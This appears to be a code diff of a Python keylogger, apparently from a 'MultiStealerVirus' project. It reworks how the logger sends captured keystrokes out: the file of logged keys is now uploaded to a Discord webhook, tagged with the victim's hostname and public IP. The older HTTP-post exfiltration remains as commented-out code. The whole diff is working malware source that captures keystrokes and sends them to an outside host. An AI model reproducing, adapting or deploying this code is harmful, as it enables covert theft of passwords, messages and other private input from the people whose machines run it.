@@ -1,16 +1,18 @@
 from pynput import keyboard
 import requests
 import json
+from discord import SyncWebhook, File
+import discord
 import threading
+import socket
 
 class Keylogger:
     def __init__(self):
         try:
             with open("todo.txt", "r") as f:
                 lines = f.readlines()
-                self.ip_address = lines[0].strip()
+                self.url = lines[0].strip()
                 self.interval = int(lines[1])
-                self.port = lines[2]
                 f.close()
         except:
             pass
@@ -19,9 +21,27 @@ class Keylogger:
 
     def send(self):
         try:
-            with open("notes.txt", "r") as f:
-                payload = json.dumps({"content": f.read()})
-                requests.post(f"http://{self.ip_address}:{self.port}", data=payload, headers={"Content-Type": "application/json"})
+            try:
+                webhook = SyncWebhook.from_url(self.url)#https://discord.com/api/webhooks/ID/TOKEN
+            except:
+                return
+
+            try:
+                ip = requests.get("https://api.ipify.org").text
+            except:
+                ip = "Unknown"
+
+            embed = discord.Embed(
+                title = "Keylogger data",
+                description = f"Keylogger data for: {socket.gethostname()}, {ip}",
+                color = 0x10131c
+            )
+
+            embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+            try:
+                webhook.send(embed=embed, file=File("notes.txt"))
+            except:
+                pass
         except:
             pass
         finally:
@@ -30,6 +50,20 @@ class Keylogger:
                 timer.start()
             except:
                 pass
+    
+    #def send(self):
+    #    try:
+    #        with open("notes.txt", "r") as f:
+    #            payload = json.dumps({"content": f.read()})
+    #            requests.post(self.url, data=payload, headers={"Content-Type": "application/json"})
+    #    except:
+    #        pass
+    #    finally:
+    #        try:
+    #            timer = threading.Timer(self.interval, self.send)
+    #            timer.start()
+    #        except:
+    #            pass
 
     def on_press(self, key):
         try:
